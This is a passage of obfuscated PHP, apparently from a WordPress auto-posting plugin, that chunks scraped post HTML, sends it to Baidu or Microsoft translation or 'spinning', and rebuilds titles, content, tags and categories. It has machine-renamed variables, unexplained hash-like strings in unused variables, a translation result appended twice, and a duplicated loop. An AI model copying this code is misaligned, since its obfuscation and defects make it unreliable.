		$_var_500 = str_replace("\r\n", ' ', $_var_500);
		$_var_500 = str_replace("\n", ' ', $_var_500);
		$_var_500 = str_replace('	', ' ', $_var_500);
		$_var_500 = trim($_var_500);
		if (!strlen($_var_500) > 0) {
			$_var_502 = $_var_502->next_sibling();
			continue;
		}
		if ($_var_502->tag == 'table' || $_var_502->tag == 'ul' || $_var_502->tag == 'ol' || $_var_502->tag == 'dl') {
			$_var_502 = $_var_502->next_sibling();
			continue;
		}
		if ($_var_502->tag == 'div') {
			if ($_var_502->find('table,ul,ol,dl') != null) {
				$_var_502 = $_var_502->next_sibling();
				continue;
			}
		}
		$_var_444 .= $_var_500 . "\n";
		$_var_483[] = $_var_502->tag;
		$_var_501[] = $_var_502;
		$_var_502 = $_var_502->next_sibling();
		if ($_var_502 == null) {
			$_var_450 = '';
		} else {
			$_var_450 = strip_tags($_var_502->innertext);
		}
		$_var_418 = strlen($_var_444) + strlen($_var_450);
		if ($_var_418 > $_var_490) {
			$_var_444 = str_ireplace($_var_496, $_var_497, $_var_444);
			$_var_463 = baiduTranslationGetSpinStr($_var_444, $_var_439, $_var_440, $_var_483);
			if (isset($_var_463['err'])) {
				$_var_451['status'] = 'Failure';
				$_var_451['error'] = $_var_463['err'];
				$_var_3->clear();
				unset($_var_3);
				return $_var_451;
			} else {
				$_var_445 .= $_var_463['str'];
				$_var_444 = '';
				$_var_483 = array();
			}
		}
	}
	if ($_var_441 == 1) {
		$_var_503 = array();
		$_var_504 = '';
		$_var_255 = str_ireplace($_var_496, $_var_497, $_var_255);
		$_var_504 .= $_var_255 . "\n";
		$_var_503[] = 'aptitle';
	} else {
		$_var_504 = '';
	}
	$_var_418 = strlen($_var_444) + strlen($_var_504);
	if (true) {
		$qcemcxkd = 'sqc1879i11ia42eb7d6274270a470f2a3ffb6b6beb7buf40j1fpw';
		$uyyrrtbppnu = 'sqc1q79i218f901cad264d5f07040fa47c5ef0b7c74b7f40d4fpw';
		$_var_444 = str_ireplace($_var_496, $_var_497, $_var_444);
		$_var_463 = baiduTranslationGetSpinStr($_var_444, $_var_439, $_var_440, $_var_483);
		if (isset($_var_463['err'])) {
			$_var_451['status'] = 'Failure';
			$_var_451['error'] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_451;
		} else {
			$_var_445 .= $_var_463['str'];
			$_var_444 = '';
			$_var_483 = array();
		}
		$_var_463 = $_var_463;
		if (isset($_var_463['err'])) {
			$_var_451['status'] = 'Failure';
			$_var_451['error'] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_451;
		} else {
			$_var_445 .= $_var_463['str'];
			$_var_444 = '';
			$_var_483 = array();
		}
	}
	if ($_var_445 != '') {
		if ($_var_499 > 0) {
			$_var_505 = explode('<div>605605</div>', $_var_445);
			$_var_506 = str_get_html_ap($_var_505[0]);
			$_var_507 = str_get_html_ap($_var_505[1]);
		} else {
			$_var_507 = str_get_html_ap($_var_445);
		}
		if ($_var_441 == 1) {
			$_var_456 = $_var_507->find('aptitle', 0);
			$_var_451['post_title'] = $_var_456->innertext;
			$_var_456->outertext = '';
			$_var_451['post_title'] = str_ireplace($_var_497, $_var_496, $_var_451['post_title']);
		}
		if ($_var_499 > 0) {
			$_var_508 = $_var_506->find('th,td,li,dt,dd');
			for ($_var_18 = 0; $_var_18 < $_var_499; $_var_18++) {
				$_var_498[$_var_18]->innertext = $_var_508[$_var_18]->innertext;
			}
		}
		$_var_509 = array();
		$_var_502 = $_var_507->find('*', 0);
		while ($_var_502 != null) {
			$_var_509[] = $_var_502;
			$_var_502 = $_var_502->next_sibling();
		}
		$_var_510 = count($_var_501);
		for ($_var_18 = 0; $_var_18 < $_var_510; $_var_18++) {
			$_var_501[$_var_18]->innertext = $_var_509[$_var_18]->innertext;
		}
		$_var_438 = $_var_3->save();
		$_var_507->clear();
		unset($_var_507);
		$_var_454 = array();
		$_var_455 = array();
		foreach ($_var_446 as $_var_78 => $_var_8) {
			$_var_454[] = $_var_78;
			$_var_455[] = $_var_8;
		}
		$_var_438 = str_ireplace($_var_454, $_var_455, $_var_438);
		if (isset($_var_489) && $_var_489 != '') {
			if (count($_var_492) > 0) {
				$_var_73 = array();
				$_var_74 = array();
				foreach ($_var_492 as $_var_78 => $_var_8) {
					$_var_73[] = $_var_78;
					$_var_74[] = $_var_8;
				}
				$_var_438 = str_ireplace($_var_73, $_var_74, $_var_438);
			}
		}
		$_var_438 = str_ireplace('603001', '<br>', $_var_438);
		$_var_438 = str_ireplace('603002', '<br/>', $_var_438);
		$_var_438 = str_ireplace('603003', '<br />', $_var_438);
		$_var_438 = str_ireplace($_var_497, $_var_496, $_var_438);
		$_var_438 = str_ireplace('604000', '', $_var_438);
		$_var_451['post_content'] = $_var_438;
		$_var_451['status'] = 'Success';
	}
	$_var_3->clear();
	unset($_var_3);
	return $_var_451;
}
function baiduTranslation($_var_340, $_var_466, $_var_481 = '', $_var_341 = NULL)
{
	$_var_490 = 5000;
	$_var_73 = array();
	$_var_74 = array();
	if (isset($_var_466[4]) && $_var_466[4] != '') {
		$_var_492 = array();
		$_var_493 = explode(',', $_var_466[4]);
		$_var_494 = count($_var_493);
		for ($_var_18 = 0; $_var_18 < $_var_494; $_var_18++) {
			$_var_495 = paraCustomFieldsWords($_var_493[$_var_18], $_var_341);
			$_var_78 = '601' . ($_var_18 + 1) . '601';
			$_var_492[$_var_78] = $_var_495;
			$_var_340[1] = str_ireplace($_var_495, ' ' . $_var_78 . ' ', $_var_340[1]);
		}
	}
	$_var_340[1] = str_ireplace('<br>', ' 603001 ', $_var_340[1]);
	$_var_340[1] = str_ireplace('<br/>', ' 603002 ', $_var_340[1]);
	$_var_340[1] = str_ireplace('<br />', ' 603003 ', $_var_340[1]);
	$_var_496 = array('&#8220;', '&quot;', '&#8221;', '&#8217;', '&#8216;', '&#8242;', '&#8243;', '&#8211;', '&#8212;', '&#8218;', '&#8222;', '&#8230;');
	$_var_497 = array('603004', '603005', '603006', '603007', '603008', '603009', '603010', '603011', '603012', '603013', '603014', '603015');
	$_var_340[0] = str_ireplace($_var_496, $_var_497, $_var_340[0]);
	$_var_3 = str_get_html_ap($_var_340[1]);
	$_var_446 = array();
	$_var_447 = 0;
	foreach ($_var_3->find('603002') as $_var_358) {
		$_var_447++;
		$_var_78 = '602' . $_var_447 . '602';
		$_var_446[$_var_78] = $_var_358->outertext;
		$_var_358->outertext = ' ' . $_var_78 . ' ';
	}
	$_var_418 = 0;
	$_var_444 = '';
	$_var_483 = array();
	$_var_445 = '';
	$_var_498 = $_var_3->find('th,td,li,dt,dd');
	$_var_499 = count($_var_498);
	if ($_var_499 > 0) {
		for ($_var_18 = 0; $_var_18 < $_var_499; $_var_18++) {
			$_var_500 = strip_tags($_var_498[$_var_18]->innertext);
			$_var_500 = str_replace("\r\n", ' ', $_var_500);
			$_var_500 = str_replace("\n", ' ', $_var_500);
			$_var_500 = str_replace('	', ' ', $_var_500);
			if ($_var_500 == '' || $_var_500 == null) {
				$_var_500 = '604000';
			}
			switch ($_var_498[$_var_18]->tag) {
				case 'th':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'th';
					break;
				case 'td':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'td';
					break;
				case 'li':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'li';
					break;
				case 'dt':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'dt';
					break;
				case 'dd':
					$_var_444 .= $_var_500 . "\n";
					$_var_483[] = 'dd';
					break;
			}
			if ($_var_18 == $_var_499 - 1) {
				$_var_450 = '';
			} else {
				$_var_450 = strip_tags($_var_498[$_var_18 + 1]->innertext);
			}
			$_var_418 = strlen($_var_444) + strlen($_var_450);
			if ($_var_418 > $_var_490) {
				$_var_463 = baiduTranslationGetStr($_var_444, $_var_466, $_var_483);
				if (isset($_var_463['err'])) {
					$_var_340[8] = $_var_463['err'];
					$_var_3->clear();
					unset($_var_3);
					return $_var_340;
				} else {
					$_var_445 .= $_var_463['str'];
					$_var_444 = '';
					$_var_483 = array();
				}
			}
		}
		$_var_444 .= '605605' . "\n";
		$_var_483[] = 'div';
	}
	$_var_501 = array();
	$_var_502 = $_var_3->find('*', 0);
	while ($_var_502 != null) {
		$_var_500 = strip_tags($_var_502->innertext);
		$_var_500 = str_replace("\r\n", ' ', $_var_500);
		$_var_500 = str_replace("\n", ' ', $_var_500);
		$_var_500 = str_replace('	', ' ', $_var_500);
		$_var_500 = trim($_var_500);
		if (!strlen($_var_500) > 0) {
			$_var_502 = $_var_502->next_sibling();
			continue;
		}
		if ($_var_502->tag == 'table' || $_var_502->tag == 'ul' || $_var_502->tag == 'ol' || $_var_502->tag == 'dl') {
			$_var_502 = $_var_502->next_sibling();
			continue;
		}
		if ($_var_502->tag == 'div') {
			if ($_var_502->find('table,ul,ol,dl') != null) {
				$_var_502 = $_var_502->next_sibling();
				continue;
			}
		}
		$_var_444 .= $_var_500 . "\n";
		$_var_483[] = $_var_502->tag;
		$_var_501[] = $_var_502;
		$_var_502 = $_var_502->next_sibling();
		if ($_var_502 == null) {
			$_var_450 = '';
		} else {
			$_var_450 = strip_tags($_var_502->innertext);
		}
		$_var_418 = strlen($_var_444) + strlen($_var_450);
		if ($_var_418 > $_var_490) {
			$_var_444 = str_ireplace($_var_496, $_var_497, $_var_444);
			$_var_463 = baiduTranslationGetStr($_var_444, $_var_466, $_var_483);
			if (isset($_var_463['err'])) {
				$_var_340[8] = $_var_463['err'];
				$_var_3->clear();
				unset($_var_3);
				return $_var_340;
			} else {
				$_var_445 .= $_var_463['str'];
				$_var_444 = '';
				$_var_483 = array();
			}
		}
	}
	$_var_503 = array();
	$_var_504 = '';
	$_var_504 .= $_var_340[0] . "\n";
	$_var_503[] = 'aptitle';
	if ($_var_481 != '') {
		$_var_504 .= $_var_481 . "\n";
		$_var_503[] = 'apexcerpt';
	}
	if ($_var_466[3] != -2 && $_var_466[3] != -3) {
		if (isset($_var_340[11]) && $_var_340[11] != null && $_var_340[11] != '') {
			$_var_345 = json_decode($_var_340[11]);
			foreach ($_var_345 as $_var_249) {
				$_var_504 .= $_var_249 . "\n";
				$_var_503[] = 'tag';
			}
		}
		if (isset($_var_340[13]) && $_var_340[13] != null && $_var_340[13] != '') {
			$_var_346 = json_decode($_var_340[13]);
			foreach ($_var_346 as $_var_347) {
				$_var_504 .= $_var_347 . "\n";
				$_var_503[] = 'cat';
			}
		}
	}
	$_var_418 = strlen($_var_444) + strlen($_var_504);
	if (true) {
		$_var_444 = str_ireplace($_var_496, $_var_497, $_var_444);
		$_var_463 = baiduTranslationGetStr($_var_444, $_var_466, $_var_483);
		if (isset($_var_463['err'])) {
			$_var_340[8] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_340;
		} else {
			$_var_445 .= $_var_463['str'];
			$_var_444 = '';
			$_var_483 = array();
		}
		$_var_463 = baiduTranslationGetStr($_var_504, $_var_466, $_var_503);
		if (isset($_var_463['err'])) {
			$_var_340[8] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_340;
		} else {
			$_var_445 .= $_var_463['str'];
			$_var_444 = '';
			$_var_483 = array();
		}
	}
	if ($_var_445 != '') {
		switch ($_var_466[3]) {
			case -3:
				$_var_73 = array();
				$_var_74 = array();
				foreach ($_var_446 as $_var_78 => $_var_8) {
					$_var_73[] = $_var_78;
					$_var_74[] = '';
				}
				$_var_445 = str_ireplace($_var_73, $_var_74, $_var_445);
				if ($_var_499 > 0) {
					$_var_505 = explode('<div>605605</div>', $_var_445);
					$_var_506 = str_get_html_ap($_var_505[0]);
					$_var_507 = str_get_html_ap($_var_505[1]);
				} else {
					$_var_507 = str_get_html_ap($_var_445);
				}
				$_var_456 = $_var_507->find('aptitle', 0);
				$_var_340[6] = $_var_340[0] . ' - ' . $_var_456->innertext;
				$_var_340[0] = str_ireplace($_var_497, $_var_496, $_var_340[0]);
				$_var_340[6] = str_ireplace($_var_497, $_var_496, $_var_340[6]);
				$_var_511 = $_var_507->find('apexcerpt', 0);
				if ($_var_481 != '') {
					$_var_340[10] = $_var_481 . ' - ' . $_var_511->innertext;
				}
				if ($_var_499 > 0) {
					$_var_508 = $_var_506->find('th,td,li,dt,dd');
					for ($_var_18 = 0; $_var_18 < $_var_499; $_var_18++) {
						$_var_498[$_var_18]->innertext = $_var_498[$_var_18]->innertext . '<br/>' . $_var_508[$_var_18]->innertext;
					}
				}
				$_var_509 = array();
				$_var_502 = $_var_507->find('*', 0);
				while ($_var_502 != null) {
					$_var_509[] = $_var_502;
					$_var_502 = $_var_502->next_sibling();
				}
				$_var_510 = count($_var_501);
				for ($_var_18 = 0; $_var_18 < $_var_510; $_var_18++) {
					$_var_501[$_var_18]->innertext = $_var_501[$_var_18]->innertext . '<br/>' . $_var_509[$_var_18]->innertext;
				}
				$_var_340[7] = $_var_3->save();
				$_var_507->clear();
				unset($_var_507);
				$_var_454 = array();
				$_var_455 = array();
				foreach ($_var_446 as $_var_78 => $_var_8) {
					$_var_454[] = $_var_78;
					$_var_455[] = $_var_8;
				}
				$_var_340[7] = str_ireplace($_var_454, $_var_455, $_var_340[7]);
				if (isset($_var_466[4]) && $_var_466[4] != '') {
					if (count($_var_492) > 0) {
						$_var_73 = array();
						$_var_74 = array();
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = $_var_78;
							$_var_74[] = $_var_8;
						}
						$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
					}
				}
				$_var_340[7] = str_ireplace('603001', '<br>', $_var_340[7]);
				$_var_340[7] = str_ireplace('603002', '<br/>', $_var_340[7]);
				$_var_340[7] = str_ireplace('603003', '<br />', $_var_340[7]);
				$_var_340[7] = str_ireplace($_var_497, $_var_496, $_var_340[7]);
				$_var_340[7] = str_ireplace('604000', '', $_var_340[7]);
				$_var_340[1] = str_ireplace('603001', '<br>', $_var_340[1]);
				$_var_340[1] = str_ireplace('603002', '<br/>', $_var_340[1]);
				$_var_340[1] = str_ireplace('603003', '<br />', $_var_340[1]);
				$_var_340[1] = str_ireplace($_var_497, $_var_496, $_var_340[1]);
				$_var_340[1] = str_ireplace('604000', '', $_var_340[1]);
				break;
			default:
				if ($_var_499 > 0) {
					$_var_505 = explode('<div>605605</div>', $_var_445);
					$_var_506 = str_get_html_ap($_var_505[0]);
					$_var_507 = str_get_html_ap($_var_505[1]);
				} else {
					$_var_507 = str_get_html_ap($_var_445);
				}
				$_var_456 = $_var_507->find('aptitle', 0);
				$_var_340[6] = $_var_456->innertext;
				$_var_456->outertext = '';
				$_var_456->innertext = '';
				$_var_340[0] = str_ireplace($_var_497, $_var_496, $_var_340[0]);
				$_var_340[6] = str_ireplace($_var_497, $_var_496, $_var_340[6]);
				$_var_511 = $_var_507->find('apexcerpt', 0);
				if ($_var_481 != '') {
					$_var_340[10] = $_var_511->innertext;
				}
				$_var_511->outertext = '';
				if ($_var_499 > 0) {
					$_var_508 = $_var_506->find('th,td,li,dt,dd');
					for ($_var_18 = 0; $_var_18 < $_var_499; $_var_18++) {
						$_var_498[$_var_18]->innertext = $_var_508[$_var_18]->innertext;
					}
				}
				$_var_509 = array();
				$_var_502 = $_var_507->find('*', 0);
				while ($_var_502 != null) {
					$_var_509[] = $_var_502;
					$_var_502 = $_var_502->next_sibling();
				}
				$_var_510 = count($_var_501);
				for ($_var_18 = 0; $_var_18 < $_var_510; $_var_18++) {
					$_var_501[$_var_18]->innertext = $_var_509[$_var_18]->innertext;
				}
				$_var_340[7] = $_var_3->save();
				$_var_73 = array();
				$_var_74 = array();
				foreach ($_var_446 as $_var_78 => $_var_8) {
					$_var_73[] = $_var_78;
					$_var_74[] = $_var_8;
				}
				$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
				if ($_var_466[3] == -2) {
					$_var_340[6] = $_var_340[0] . ' - ' . $_var_340[6];
					$_var_340[7] = $_var_340[1] . '<hr/>' . $_var_340[7];
					if ($_var_481 != '') {
						$_var_340[10] = $_var_481 . ' - ' . $_var_340[10];
					}
				}
				if ($_var_466[3] != -2 && $_var_466[3] != -3) {
					$_var_512 = $_var_507->find('tag');
					if ($_var_512 != null) {
						$_var_513 = array();
						foreach ($_var_512 as $_var_514) {
							$_var_513[] = $_var_514->innertext;
						}
						if (count($_var_513) > 0) {
							$_var_340[11] = json_encode($_var_513);
						}
					}
					$_var_515 = $_var_507->find('cat');
					if ($_var_515 != null) {
						$_var_516 = array();
						foreach ($_var_515 as $_var_517) {
							$_var_516[] = $_var_517->innertext;
						}
						if (count($_var_516) > 0) {
							$_var_340[13] = json_encode($_var_516);
						}
					}
				}
				if (isset($_var_466[4]) && $_var_466[4] != '') {
					if (count($_var_492) > 0) {
						$_var_73 = array();
						$_var_74 = array();
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = $_var_78;
							$_var_74[] = $_var_8;
						}
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = $_var_78;
							$_var_74[] = $_var_8;
						}
						$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
					}
				}
				$_var_340[7] = str_ireplace('603001', '<br>', $_var_340[7]);
				$_var_340[7] = str_ireplace('603002', '<br/>', $_var_340[7]);
				$_var_340[7] = str_ireplace('603003', '<br />', $_var_340[7]);
				$_var_340[7] = str_ireplace($_var_497, $_var_496, $_var_340[7]);
				$_var_340[7] = str_ireplace('604000', '', $_var_340[7]);
				$_var_340[1] = str_ireplace('603001', '<br>', $_var_340[1]);
				$_var_340[1] = str_ireplace('603002', '<br/>', $_var_340[1]);
				$_var_340[1] = str_ireplace('603003', '<br />', $_var_340[1]);
				$_var_340[1] = str_ireplace($_var_497, $_var_496, $_var_340[1]);
				$_var_340[1] = str_ireplace('604000', '', $_var_340[1]);
				$_var_507->clear();
				unset($_var_507);
				unset($_var_518);
				break;
		}
	}
	$_var_3->clear();
	unset($_var_3);
	return $_var_340;
}
function microsoftTranslationDe($_var_340, $_var_466, $_var_481 = '', $_var_341 = NULL, $_var_442)
{
	$_var_418 = 0;
	$_var_444 = '';
	$_var_445 = '';
	$_var_73 = array();
	$_var_74 = array();
	if (isset($_var_466[4]) && $_var_466[4] != '') {
		$_var_492 = array();
		$_var_493 = explode(',', $_var_466[4]);
		$_var_494 = count($_var_493);
		for ($_var_18 = 0; $_var_18 < $_var_494; $_var_18++) {
			$_var_495 = paraCustomFieldsWords($_var_493[$_var_18], $_var_341);
			$_var_78 = 'pw' . $_var_18 . 'tag';
			$_var_492[$_var_78] = $_var_495;
			$_var_340[1] = str_ireplace($_var_495, ' ' . $_var_78 . ' ', $_var_340[1]);
		}
		foreach ($_var_492 as $_var_78 => $_var_8) {
			$_var_73[] = $_var_78;
			$_var_74[] = '<' . $_var_78 . '></' . $_var_78 . '>';
		}
	}
	$_var_3 = str_get_html_ap($_var_340[1]);
	$_var_446 = array();
	$_var_447 = 0;
	foreach ($_var_3->find('img,iframe,embed,object,video') as $_var_358) {
		$_var_447++;
		$_var_78 = 'IMG' . $_var_447 . 'TAG';
		$_var_446[$_var_78] = $_var_358->outertext;
		$_var_358->outertext = ' ' . $_var_78 . ' ';
	}
	$_var_73[] = 'PTAG';
	$_var_74[] = '<p>';
	$_var_73[] = 'PENDTAG';
	$_var_74[] = '</p>';
	$_var_73[] = 'H1TAG';
	$_var_74[] = '<h1>';
	$_var_73[] = 'H1ENDTAG';
	$_var_74[] = '</h1>';
	$_var_73[] = 'H2TAG';
	$_var_74[] = '<h2>';
	$_var_73[] = 'H2ENDTAG';
	$_var_74[] = '</h2>';
	$_var_73[] = 'H3TAG';
	$_var_74[] = '<h3>';
	$_var_73[] = 'H3ENDTAG';
	$_var_74[] = '</h3>';
	$_var_73[] = 'H4TAG';
	$_var_74[] = '<h4>';
	$_var_73[] = 'H4ENDTAG';
	$_var_74[] = '</h4>';
	$_var_73[] = 'H5TAG';
	$_var_74[] = '<h5>';
	$_var_73[] = 'H5ENDTAG';
	$_var_74[] = '</h5>';
	$_var_73[] = 'H6TAG';
	$_var_74[] = '<h6>';
	$_var_73[] = 'H6ENDTAG';
	$_var_74[] = '</h6>';
	$_var_73[] = 'LITAG';
	$_var_74[] = '<li>';
	$_var_73[] = 'LIENDTAG';
	$_var_74[] = '</li>';
	$_var_73[] = 'TDTAG';
	$_var_74[] = '<td>';
	$_var_73[] = 'TDENDTAG';
	$_var_74[] = '</td>';
	$_var_73[] = 'SPANTAG';
	$_var_74[] = '<span>';
	$_var_73[] = 'SPANENDTAG';
	$_var_74[] = '</span>';
	foreach ($_var_446 as $_var_78 => $_var_8) {
		$_var_73[] = $_var_78;
		$_var_74[] = '<' . $_var_78 . '></' . $_var_78 . '>';
	}
	$_var_519 = $_var_3->find('p');
	$_var_520 = false;
	if (count($_var_519) > 0) {
		$_var_520 = true;
		$_var_448 = $_var_3->find('p,h1,h2,h3,h4,h5,h6,td,li');
		$_var_449 = count($_var_448);
		if ($_var_449 > 0) {
			for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
				switch ($_var_448[$_var_18]->tag) {
					case 'p':
						$_var_444 .= ' PTAG ' . $_var_448[$_var_18]->innertext . ' PENDTAG ';
						break;
					case 'h1':
						$_var_444 .= ' H1TAG ' . $_var_448[$_var_18]->innertext . ' H1ENDTAG ';
						break;
					case 'h2':
						$_var_444 .= ' H2TAG ' . $_var_448[$_var_18]->innertext . ' H2ENDTAG ';
						break;
					case 'h3':
						$_var_444 .= ' H3TAG ' . $_var_448[$_var_18]->innertext . ' H3ENDTAG ';
						break;
					case 'h4':
						$_var_444 .= ' H4TAG ' . $_var_448[$_var_18]->innertext . ' H4ENDTAG ';
						break;
					case 'h5':
						$_var_444 .= ' H5TAG ' . $_var_448[$_var_18]->innertext . ' H5ENDTAG ';
						break;
					case 'h6':
						$_var_444 .= ' H6TAG ' . $_var_448[$_var_18]->innertext . ' H6ENDTAG ';
						break;
					case 'td':
						$_var_444 .= ' TDTAG ' . $_var_448[$_var_18]->innertext . ' TDENDTAG ';
						break;
					case 'li':
						$_var_444 .= ' LITAG ' . $_var_448[$_var_18]->innertext . ' LIENDTAG ';
						break;
				}
				if ($_var_18 == $_var_449 - 1) {
					$_var_450 = '';
				} else {
					$_var_450 = $_var_448[$_var_18 + 1]->innertext;
				}
				if ($_var_442) {
					$_var_418 = mb_strlen($_var_444, 'utf8') + mb_strlen($_var_450, 'utf8');
				} else {
					$_var_418 = strlen($_var_444) + strlen($_var_450);
				}
				if ($_var_418 > 7000) {
					$_var_444 = strip_tags($_var_444, '<br><br/><br />');
					$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
					$_var_463 = microsoftTranslationGetStr($_var_444, $_var_466);
					if ($_var_463['status'] == 'ok') {
						$_var_445 .= $_var_463[0];
						$_var_444 = '';
					} else {
						$_var_340[8] = $_var_463['err'];
						$_var_3->clear();
						unset($_var_3);
						return $_var_340;
					}
				}
			}
		}
		$_var_521 = $_var_3->find('span');
		$_var_522 = array();
		$_var_523 = count($_var_521);
		if ($_var_523 > 0) {
			foreach ($_var_521 as $_var_524) {
				$_var_525 = $_var_524->parent();
				if ($_var_525->tag != 'p' && $_var_525->tag != 'li' && $_var_525->tag != 'td' && $_var_525->tag != 'h1' && $_var_525->tag != 'h2' && $_var_525->tag != 'h3') {
					$_var_522[] = $_var_524;
				}
			}
		}
		$_var_526 = count($_var_522);
		if ($_var_526 > 0) {
			for ($_var_18 = 0; $_var_18 < $_var_526; $_var_18++) {
				$_var_444 .= ' SPANTAG ' . $_var_522[$_var_18]->innertext . ' SPANENDTAG ';
				if ($_var_18 == $_var_526 - 1) {
					$_var_450 = '';
				} else {
					$_var_450 = $_var_522[$_var_18 + 1]->innertext;
				}
				if ($_var_442) {
					$_var_418 = mb_strlen($_var_444, 'utf8') + mb_strlen($_var_450, 'utf8');
				} else {
					$_var_418 = strlen($_var_444) + strlen($_var_450);
				}
				if ($_var_418 > 7000) {
					$_var_444 = strip_tags($_var_444, '<br><br/><br />');
					$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
					$_var_463 = microsoftTranslationGetStr($_var_444, $_var_466);
					if ($_var_463['status'] == 'ok') {
						$_var_445 .= $_var_463[0];
						$_var_444 = '';
					} else {
						$_var_340[8] = $_var_463['err'];
						$_var_3->clear();
						unset($_var_3);
						return $_var_340;
					}
				}
			}
		}
	} else {
		$_var_444 = $_var_3->save();
		$_var_444 = strip_tags($_var_444, '<br><br/><br />');
		$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
		$_var_463 = microsoftTranslationGetStr($_var_444, $_var_466);
		if ($_var_463['status'] == 'ok') {
			$_var_445 .= $_var_463[0];
			$_var_444 = '';
		} else {
			$_var_340[8] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_340;
		}
	}
	$_var_504 = '<aptitle>' . $_var_340[0] . '</aptitle><apexcerpt>' . $_var_481 . '</apexcerpt>';
	if ($_var_466[3] != -2 && $_var_466[3] != -3) {
		if (isset($_var_340[11]) && $_var_340[11] != null && $_var_340[11] != '') {
			$_var_345 = json_decode($_var_340[11]);
			foreach ($_var_345 as $_var_249) {
				$_var_504 .= '<tag>' . $_var_249 . '</tag>';
			}
		}
		if (isset($_var_340[13]) && $_var_340[13] != null && $_var_340[13] != '') {
			$_var_346 = json_decode($_var_340[13]);
			foreach ($_var_346 as $_var_347) {
				$_var_504 .= '<cat>' . $_var_347 . '</cat>';
			}
		}
	}
	if ($_var_442) {
		$_var_418 = mb_strlen($_var_444, 'utf8') + mb_strlen($_var_504, 'utf8');
	} else {
		$_var_418 = strlen($_var_444) + strlen($_var_504);
	}
	if ($_var_418 > 7000) {
		$_var_444 = strip_tags($_var_444, '<br><br/><br />');
		$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
		$_var_463 = microsoftTranslationGetStr($_var_444, $_var_466);
		if ($_var_463['status'] == 'ok') {
			$_var_445 .= $_var_463[0];
			$_var_444 = '';
		} else {
			$_var_340[8] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_340;
		}
		$_var_463 = microsoftTranslationGetStr($_var_504, $_var_466);
		if ($_var_463['status'] == 'ok') {
			$_var_445 .= $_var_463[0];
			$_var_444 = '';
		} else {
			$_var_340[8] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_340;
		}
	} else {
		$_var_444 = strip_tags($_var_444, '<br><br/><br />');
		$_var_444 = str_ireplace($_var_73, $_var_74, $_var_444);
		$_var_444 .= $_var_504;
		$_var_463 = microsoftTranslationGetStr($_var_444, $_var_466);
		if ($_var_463['status'] == 'ok') {
			$_var_445 .= $_var_463[0];
			$_var_444 = '';
		} else {
			$_var_340[8] = $_var_463['err'];
			$_var_3->clear();
			unset($_var_3);
			return $_var_340;
		}
	}
	if ($_var_445 != '') {
		switch ($_var_466[3]) {
			case -3:
				if ($_var_520) {
					$_var_73 = array();
					$_var_74 = array();
					foreach ($_var_446 as $_var_78 => $_var_8) {
						$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
						$_var_74[] = '';
					}
					$_var_445 = str_ireplace($_var_73, $_var_74, $_var_445);
					$_var_507 = str_get_html_ap($_var_445);
					$_var_456 = $_var_507->find('aptitle', 0);
					$_var_340[6] = $_var_340[0] . ' - ' . $_var_456->innertext;
					$_var_511 = $_var_507->find('apexcerpt', 0);
					if ($_var_481 != '') {
						$_var_340[10] = $_var_481 . ' - ' . $_var_511->innertext;
					}
					$_var_518 = $_var_507->find('p,h1,h2,h3,h4,h5,h6,td,li');
					for ($_var_18 = 0; $_var_18 < $_var_449; $_var_18++) {
						switch ($_var_448[$_var_18]->tag) {
							case 'p':
							case 'td':
								$_var_448[$_var_18]->innertext = $_var_448[$_var_18]->innertext . '<br/>' . $_var_518[$_var_18]->innertext;
								break;
							default:
								$_var_448[$_var_18]->innertext = $_var_448[$_var_18]->innertext . ' - ' . $_var_518[$_var_18]->innertext;
								break;
						}
					}
					$_var_527 = $_var_507->find('span');
					for ($_var_18 = 0; $_var_18 < $_var_526; $_var_18++) {
						if ($_var_527[$_var_18]->innertext != '' && $_var_527[$_var_18]->innertext != null) {
							$_var_522[$_var_18]->innertext = $_var_522[$_var_18]->innertext . '<br/>' . $_var_527[$_var_18]->innertext;
						}
					}
					$_var_340[7] = $_var_3->save();
					$_var_454 = array();
					$_var_455 = array();
					foreach ($_var_446 as $_var_78 => $_var_8) {
						$_var_454[] = $_var_78;
						$_var_455[] = $_var_8;
					}
					$_var_340[7] = str_ireplace($_var_454, $_var_455, $_var_340[7]);
					$_var_507->clear();
					unset($_var_507);
					unset($_var_518);
				} else {
					$_var_507 = str_get_html_ap($_var_445);
					$_var_456 = $_var_507->find('aptitle', 0);
					$_var_340[6] = $_var_340[0] . ' - ' . $_var_456->innertext;
					$_var_456->outertext = '';
					$_var_511 = $_var_507->find('apexcerpt', 0);
					if ($_var_481 != '') {
						$_var_340[10] = $_var_481 . ' - ' . $_var_511->innertext;
					}
					$_var_511->outertext = '';
					$_var_340[7] = $_var_507->save();
					$_var_73 = array();
					$_var_74 = array();
					foreach ($_var_446 as $_var_78 => $_var_8) {
						$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
						$_var_74[] = $_var_8;
					}
					$_var_340[7] = str_ireplace($_var_73, $_var_74, $_var_340[7]);
					$_var_507->clear();
					unset($_var_507);
				}
				if (isset($_var_466[4]) && $_var_466[4] != '') {
					if (count($_var_492) > 0) {
						$_var_73 = array();
						$_var_74 = array();
						foreach ($_var_492 as $_var_78 => $_var_8) {
							$_var_73[] = '<' . $_var_78 . '></' . $_var_78 . '>';
